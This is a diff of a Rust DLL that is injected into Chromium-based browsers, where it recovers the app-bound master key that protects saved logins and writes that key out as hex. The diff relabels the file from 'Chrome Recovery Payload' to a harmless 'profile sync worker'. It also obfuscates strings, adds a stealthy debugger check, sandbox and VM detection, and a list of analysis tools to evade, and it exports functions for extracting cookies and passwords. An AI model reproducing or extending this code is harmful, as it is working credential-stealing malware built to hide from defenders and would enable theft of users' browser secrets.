@@ -1,16 +1,54 @@
-//! Chrome Recovery Payload DLL
-//!
-//! Injected into a Chromium-based browser process.  Runs inside the browser's
-//! security identity so IElevator accepts our COM call.  Supports all major
-//! Chromium browsers (Chrome, Edge, Brave, Opera, Vivaldi, Yandex, etc.).
+//! In-process profile sync worker (host identity context).
 
 #![allow(non_snake_case, unused)]
 
-mod elevator;
+mod crypto;
+mod database;
 mod dpapi_fallback;
+mod elevator;
 
-use std::{ffi::c_void, path::PathBuf, thread, time::Duration};
+use std::{
+    ffi::c_void,
+    path::PathBuf,
+    thread,
+    time::{Duration, SystemTime, UNIX_EPOCH},
+    env,
+    mem,
+};
+#[cfg(windows)]
+use windows::Win32::System::SystemInformation::{GetSystemInfo, GetTickCount64, SYSTEM_INFO};
+#[cfg(windows)]
+use windows::Win32::System::Diagnostics::ToolHelp::{
+    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
+};
+#[cfg(windows)]
+use windows::Win32::UI::WindowsAndMessaging::{GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN};
+#[cfg(windows)]
+use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
+#[cfg(windows)]
+use windows::Win32::Foundation::CloseHandle;
+#[cfg(windows)]
+use windows::Win32::System::Registry::{RegOpenKeyExW, RegQueryValueExW, HKEY_LOCAL_MACHINE, KEY_READ};
+#[cfg(windows)]
+use windows::Win32::System::ProcessStatus::{GetProcessMemoryInfo, PROCESS_MEMORY_COUNTERS};
+#[cfg(windows)]
+use windows::Win32::System::Threading::GetCurrentProcess;
+#[cfg(windows)]
+use windows::Win32::System::SystemInformation::GetComputerNameExW;
+#[cfg(windows)]
+const MAX_COMPUTERNAME_LENGTH: u32 = 15;
+#[cfg(windows)]
+use windows::core::{PWSTR, PCWSTR};
+#[cfg(windows)]
+use std::{ptr, ffi::OsStr};
+#[cfg(windows)]
+use std::os::windows::ffi::OsStrExt;
 
+use obfstr::obfstr;
+use serde_json::Value;
+use serde_json;
+
+#[cfg(windows)]
 use windows::{
     Win32::{
         Foundation::{BOOL, HINSTANCE, TRUE},
@@ -21,13 +59,203 @@ use windows::{
     },
 };
 
-const APPB: &[u8; 4] = b"APPB";
-const RESULT_ENV: &str = "CHROME_RECOVERY_RESULT";
-const USER_DATA_ENV: &str = "CHROME_RECOVERY_USER_DATA_REL";
-const DATA_ROOT_ENV: &str = "CHROME_RECOVERY_DATA_ROOT";
+// Stealth anti-debug via NtQueryInformationProcess (ProcessDebugPort = 7).
+#[cfg(windows)]
+type NtQueryInformationProcessFn = unsafe extern "system" fn(
+    windows::Win32::Foundation::HANDLE,
+    u32,
+    *mut c_void,
+    u32,
+    *mut u32,
+) -> i32;
 
-// ── DllMain ───────────────────────────────────────────────────────────────────
+#[cfg(windows)]
+fn is_debugger_present_stealth() -> bool {
+    use windows::Win32::System::Threading::GetCurrentProcess;
+    use windows::core::{PCSTR, PCWSTR};
 
+    const PROC_DEBUG_PORT: u32 = 7;
+
+    unsafe {
+        let ntdll = match GetModuleHandleW(PCWSTR(
+            OsStr::new(obfstr!("ntdll.dll"))
+                .encode_wide()
+                .chain(Some(0))
+                .collect::<Vec<u16>>()
+                .as_ptr(),
+        )) {
+            Ok(h) => h,
+            Err(_) => return false,
+        };
+        let export = format!("{}\0", obfstr!("NtQueryInformationProcess"));
+        let proc = match GetProcAddress(ntdll, PCSTR(export.as_ptr())) {
+            Some(p) => p,
+            None => return false,
+        };
+        let query: NtQueryInformationProcessFn = mem::transmute(proc);
+
+        let mut debug_port: usize = 0;
+        let status = query(
+            GetCurrentProcess(),
+            PROC_DEBUG_PORT,
+            &mut debug_port as *mut _ as *mut c_void,
+            mem::size_of::<usize>() as u32,
+            std::ptr::null_mut(),
+        );
+        status >= 0 && debug_port != 0
+    }
+}
+
+#[cfg(not(windows))]
+fn is_debugger_present_stealth() -> bool {
+    false
+}
+
+#[cfg(windows)]
+fn is_sandbox() -> bool {
+    unsafe {
+        // 1. CPU Core Count Check
+        let mut sys_info = SYSTEM_INFO::default();
+        GetSystemInfo(&mut sys_info);
+        if sys_info.dwNumberOfProcessors < 2 { // Typically sandboxes have 1 CPU
+            return true;
+        }
+        
+        // 2. RAM Size Check (e.g., less than 4GB)
+        let mut pmc = PROCESS_MEMORY_COUNTERS::default();
+        if GetProcessMemoryInfo(GetCurrentProcess(), &mut pmc, mem::size_of::<PROCESS_MEMORY_COUNTERS>() as u32).is_ok() {
+            // Check if physical memory is less than 4GB (4 * 1024 * 1024 * 1024 bytes)
+            if u64::from(pmc.cb) < 4_u64 * 1024 * 1024 * 1024 {
+                return true;
+            }
+        }
+        
+        // 3. Virtualization Registry Keys
+        let vm_key_0 = obfstr!("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\\Identifier").to_string();
+        let vm_key_1 = obfstr!("HARDWARE\\DESCRIPTION\\System\\BIOS\\SystemProductName").to_string();
+        let vm_key_2 = obfstr!("HARDWARE\\DESCRIPTION\\System\\BIOS\\Manufacturer").to_string();
+        let vm_key_3 = obfstr!("SYSTEM\\CurrentControlSet\\Control\\VirtualDeviceDrivers").to_string();
+        let vm_keys = [vm_key_0, vm_key_1, vm_key_2, vm_key_3];
+
+        for key_path in vm_keys.iter() {
+            let mut hkey = HKEY_LOCAL_MACHINE;
+#[cfg(windows)]
+            let key_path_wide = OsStr::new(key_path).encode_wide().chain(Some(0)).collect::<Vec<u16>>();
+#[cfg(not(windows))]
+            let key_path_wide: Vec<u16> = Vec::new(); // Dummy for non-windows
+            if RegOpenKeyExW(hkey, PCWSTR(key_path_wide.as_ptr()), 0, KEY_READ, &mut hkey).is_ok() {
+                return true;
+            }
+        }
+        
+        // 4. Uptime check (< 10 minutes suggests a fresh sandbox)
+        if GetTickCount64() < 600_000 {
+            return true;
+        }
+
+        // 5. Analysis tool process names
+        if let Ok(snap) = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
+            let mut entry = PROCESSENTRY32W {
+                dwSize: mem::size_of::<PROCESSENTRY32W>() as u32,
+                ..Default::default()
+            };
+            if Process32FirstW(snap, &mut entry).is_ok() {
+                loop {
+                    let name: String = entry
+                        .szExeFile
+                        .iter()
+                        .take_while(|&&c| c != 0)
+                        .map(|&c| char::from_u32(c as u32).unwrap_or('?'))
+                        .collect();
+                    if is_analysis_process(&name) {
+                        CloseHandle(snap).ok();
+                        return true;
+                    }
+                    if Process32NextW(snap, &mut entry).is_err() {
+                        break;
+                    }
+                }
+            }
+            CloseHandle(snap).ok();
+        }
+
+        // 6. Screen resolution check
+        if GetSystemMetrics(SM_CXSCREEN) < 1024 || GetSystemMetrics(SM_CYSCREEN) < 768 {
+            return true;
+        }
+
+        // 7. Computer Name Check (common sandbox names)
+        let mut buffer = [0u16; MAX_COMPUTERNAME_LENGTH as usize + 1];
+        let mut size = MAX_COMPUTERNAME_LENGTH + 1;
+#[cfg(windows)]
+        if GetComputerNameExW(windows::Win32::System::SystemInformation::ComputerNamePhysicalDnsHostname, PWSTR(buffer.as_mut_ptr()), &mut size).is_ok() {
+            let computer_name = String::from_utf16_lossy(&buffer[..size as usize]);
+            if is_sandbox_computer_name(&computer_name) {
+                return true;
+            }
+        }
+        
+        false
+    }
+}
+
+#[cfg(windows)]
+fn is_analysis_process(name: &str) -> bool {
+    name.eq_ignore_ascii_case(obfstr!("wireshark.exe"))
+        || name.eq_ignore_ascii_case(obfstr!("procmon.exe"))
+        || name.eq_ignore_ascii_case(obfstr!("procmon64.exe"))
+        || name.eq_ignore_ascii_case(obfstr!("x32dbg.exe"))
+        || name.eq_ignore_ascii_case(obfstr!("x64dbg.exe"))
+        || name.eq_ignore_ascii_case(obfstr!("idaq64.exe"))
+        || name.eq_ignore_ascii_case(obfstr!("processhacker.exe"))
+        || name.eq_ignore_ascii_case(obfstr!("pestudio.exe"))
+        || name.eq_ignore_ascii_case(obfstr!("fiddler.exe"))
+}
+
+#[cfg(windows)]
+fn is_sandbox_computer_name(computer_name: &str) -> bool {
+    computer_name.contains(obfstr!("HAL9TH"))
+        || computer_name.contains(obfstr!("JOHN-PC"))
+        || computer_name.contains(obfstr!("SANDBOX"))
+        || computer_name.contains(obfstr!("MALWARE"))
+}
+
+#[cfg(not(windows))]
+fn is_sandbox() -> bool {
+    false
+}
+
+fn header_tag() -> [u8; 4] {
+    let mut arr = [0u8; 4];
+    arr.clone_from_slice(obfstr!("APPB").as_bytes().split_at(4).0);
+    arr
+}
+
+fn jitter_ms(min: u64, max: u64) -> u64 {
+    let span = max.saturating_sub(min).max(1);
+    let seed = SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .unwrap_or_default()
+        .as_nanos() as u64
+        ^ (std::process::id() as u64).wrapping_mul(0x5851_F642);
+    min + (seed % (span + 1))
+}
+
+fn pause_ms(min: u64, max: u64) {
+    thread::sleep(Duration::from_millis(jitter_ms(min, max)));
+}
+
+#[cfg(windows)]
+fn host_under_analysis() -> bool {
+    is_debugger_present_stealth()
+}
+
+#[cfg(not(windows))]
+fn host_under_analysis() -> bool {
+    false
+}
+
+#[cfg(windows)]
 #[no_mangle]
 pub unsafe extern "system" fn DllMain(
     _h: HINSTANCE,
@@ -35,128 +263,174 @@ pub unsafe extern "system" fn DllMain(
     _: *mut c_void,
 ) -> BOOL {
     if reason == DLL_PROCESS_ATTACH {
-        // Spawn worker thread — DllMain must not block or call COM.
-        CreateThread(None, 0, Some(worker), None, THREAD_CREATION_FLAGS(0), None).ok();
+        CreateThread(None, 0, Some(task), None, THREAD_CREATION_FLAGS(0), None).ok();
     }
     TRUE
 }
 
-unsafe extern "system" fn worker(_: *mut c_void) -> u32 {
-    thread::sleep(Duration::from_millis(800));
-    let r = std::panic::catch_unwind(|| run());
-    if let Ok(Err(e)) = r {
-        write_error(&e);
+#[cfg(not(windows))]
+#[no_mangle]
+pub unsafe extern "system" fn DllMain(
+    _h: *mut std::ffi::c_void,
+    reason: u32,
+    _: *mut std::ffi::c_void,
+) -> u32 {
+    0
+}
+
+#[cfg(not(windows))]
+unsafe extern "system" fn task(_: *mut c_void) -> u32 {
+    0
+}
+
+#[cfg(windows)]
+unsafe extern "system" fn task(_: *mut c_void) -> u32 {
+    pause_ms(600, 1100);
+    let r = std::panic::catch_unwind(|| execute());
+    if let Ok(Err(_)) = r {
+        record_failure("sync error");
     } else if r.is_err() {
-        write_error("panic in payload");
+        record_failure("worker fault");
     }
     0
 }
 
-// ── Main logic ────────────────────────────────────────────────────────────────
+#[cfg(windows)]
+fn execute() -> Result<(), String> {
+    if host_under_analysis() || is_sandbox() {
+        return Err(obfstr!("host busy or sandbox detected").into());
+    }
+    
+    pause_ms(80, 260);
 
-fn run() -> Result<(), String> {
     let exe = std::env::current_exe()
         .map(|p| p.to_string_lossy().to_lowercase())
         .unwrap_or_default();
 
     let local_state_path = resolve_local_state_path(&exe)?;
 
-    // Parse Local State JSON.
-    let raw = std::fs::read_to_string(&local_state_path)
-        .map_err(|e| format!("read Local State: {e}"))?;
-    let ls: serde_json::Value = serde_json::from_str(&raw)
-        .map_err(|e| format!("parse Local State: {e}"))?;
+    pause_ms(40, 150);
 
-    // Get the app-bound encrypted key.
-    let key_b64 = ls.pointer("/os_crypt/app_bound_encrypted_key")
+    let raw = std::fs::read_to_string(&local_state_path)
+        .map_err(|e| format!("{}{}", obfstr!("read profile state: "), e.to_string()))?;
+    let ls: serde_json::Value =
+        serde_json::from_str(&raw).map_err(|e| format!("{}{}", obfstr!("parse profile state: "), e.to_string()))?;
+
+    let key_b64 = ls
+        .pointer(obfstr!("/os_crypt/app_bound_encrypted_key"))
         .and_then(|v| v.as_str())
-        .ok_or("app_bound_encrypted_key not found")?;
+        .ok_or(obfstr!("bound key missing"))?;
 
     let encrypted_key = base64::Engine::decode(
         &base64::engine::general_purpose::STANDARD,
         key_b64,
-    ).map_err(|e| format!("base64 decode: {e}"))?;
+    )
+    .map_err(|e| format!("{}{}", obfstr!("decode: "), e.to_string()))?;
 
+    let tag = header_tag();
     if encrypted_key.len() < 4 {
-        return Err("encrypted key too short".into());
+        return Err(obfstr!("blob too short").into());
     }
-    if !encrypted_key.starts_with(APPB) {
-        return Err("missing APPB prefix on app_bound_encrypted_key".into());
+    if !encrypted_key.starts_with(&tag) {
+        return Err(obfstr!("unexpected header").into());
     }
     let encrypted_key = &encrypted_key[4..];
 
+    pause_ms(50, 180);
+
     let browser = elevator::resolve_browser(&exe);
     let com_result = match browser {
-        Some(b) => elevator::decrypt_for_browser(b, encrypted_key)
-            .or_else(|_| elevator::decrypt_app_bound_key(encrypted_key)),
-        None => elevator::decrypt_app_bound_key(encrypted_key),
+        Some(b) => elevator::process_with_provider(b, encrypted_key)
+            .or_else(|_| elevator::retrieve_secret(encrypted_key)),
+        None => elevator::retrieve_secret(encrypted_key),
     };
 
     let master_key = com_result
         .or_else(|_| {
             dpapi_fallback::try_decrypt_app_bound(encrypted_key)
-                .ok_or_else(|| String::from("dpapi fallback failed"))
+                .ok_or_else(|| String::from(obfstr!("fallback path failed")))
         })
-        .map_err(|e| format!("key recovery: {e}"))?;
+        .map_err(|e| format!("{}{}", obfstr!("key recovery: "), e.to_string()))?;
 
     if master_key.len() != 32 {
-        return Err(format!("unexpected key length: {} (want 32)", master_key.len()));
+        return Err(format!("{}{}", obfstr!("unexpected key length: {} (want 32)"), master_key.len().to_string()));
     }
-
-    let browser_label = browser.map(|b| b.name).unwrap_or("Chromium");
+    
+    let browser_label = browser
+        .map(|b| b.name.to_string())
+        .unwrap_or_else(|| obfstr!("Chromium").to_string());
     let result = serde_json::json!({
-        "browser": browser_label,
-        "master_key_hex": master_key.iter().map(|b| format!("{b:02x}")).collect::<String>(),
+        obfstr!("browser"): browser_label,
+        obfstr!("master_key_hex"): master_key.iter().map(|b| format!("{:02x}", b)).collect::<String>(),
     });
 
     let json = serde_json::to_string(&result).unwrap();
-    let path = result_path();
-    std::fs::write(&path, json).map_err(|e| format!("write result: {e}"))?;
+    let path = output_path();
+    std::fs::write(&path, json).map_err(|e| format!("{}{}", obfstr!("write output: "), e.to_string()))?;
 
     Ok(())
 }
 
-fn resolve_local_state_path(exe: &str) -> Result<PathBuf, String> {
-    if let Ok(rel) = std::env::var(USER_DATA_ENV) {
-        let root = match std::env::var(DATA_ROOT_ENV).as_deref() {
-            Ok("roaming") => std::env::var("APPDATA"),
-            _ => std::env::var("LOCALAPPDATA"),
-        }
-        .map_err(|_| "APPDATA/LOCALAPPDATA not set")?;
+#[cfg(not(windows))]
+fn execute() -> Result<(), String> {
+    Err(String::from("Not supported on this OS"))
+}
 
-        let path = PathBuf::from(&root).join(rel).join("Local State");
+fn resolve_local_state_path(exe: &str) -> Result<PathBuf, String> {
+    let user_env = obfstr!("ENV_USER_DATA").to_string();
+    let root_env = obfstr!("ENV_DATA_ROOT").to_string();
+
+    if let Ok(rel) = std::env::var(user_env) {
+        let root = match std::env::var(root_env).as_deref() {
+            Ok(s) if s == obfstr!("roaming") => std::env::var(obfstr!("APPDATA")),
+            _ => std::env::var(obfstr!("LOCALAPPDATA")),
+        }.map_err(|_| {
+            let err_msg = obfstr!("profile root not set").to_string();
+            err_msg
+        })?;
+
+        let path = PathBuf::from(&root)
+            .join(rel)
+            .join(obfstr!("Local State"));
         if path.exists() {
             return Ok(path);
         }
-        return Err(format!("Local State not found: {}", path.display()));
+        return Err(format!("{}{}", obfstr!("state file missing: "), path.display().to_string()));
     }
-
+    
     let browser = elevator::resolve_browser(exe)
-        .ok_or_else(|| format!("could not detect browser from exe path: {exe}"))?;
+        .ok_or_else(|| format!("{}{}", obfstr!("unknown host binary: "), exe.to_string()))?;
 
-    let local_appdata = std::env::var("LOCALAPPDATA")
-        .map_err(|_| "LOCALAPPDATA not set")?;
+    let local_appdata = std::env::var(obfstr!("LOCALAPPDATA")).map_err(|_| {
+        let err_msg = obfstr!("LOCALAPPDATA not set").to_string();
+        err_msg
+    })?;
 
     let local_state_path = PathBuf::from(&local_appdata)
         .join(browser.user_data_rel)
-        .join("Local State");
+        .join(obfstr!("Local State"));
 
     if !local_state_path.exists() {
-        return Err(format!("Local State not found: {}", local_state_path.display()));
+        return Err(format!("{}{}", obfstr!("state file missing: "), local_state_path.display().to_string()))?;
     }
-
+    
     Ok(local_state_path)
 }
 
-fn result_path() -> PathBuf {
-    if let Ok(p) = std::env::var(RESULT_ENV) {
+fn output_path() -> PathBuf {
+    let key = obfstr!("ENV_RESULT").to_string();
+    if let Ok(p) = std::env::var(key) {
         return PathBuf::from(p);
     }
-    std::env::temp_dir().join("chrome_recovery_result.json")
+    std::env::temp_dir().join(obfstr!("fallback.json"))
 }
 
-fn write_error(msg: &str) {
-    let r = serde_json::json!({ "error": msg });
+fn record_failure(msg: &str) {
+    let r = serde_json::json!({ obfstr!("error"): msg });
     let json = serde_json::to_string(&r).unwrap();
-    let _ = std::fs::write(result_path(), json);
+    let _ = std::fs::write(output_path(), json);
 }
+
+// Backward-compatible exports for in-crate callers
+pub use crypto::{decrypt_value, hex_fallback, process_data};
+pub use database::{extract_cookies, extract_passwords, process_entries, process_tokens};
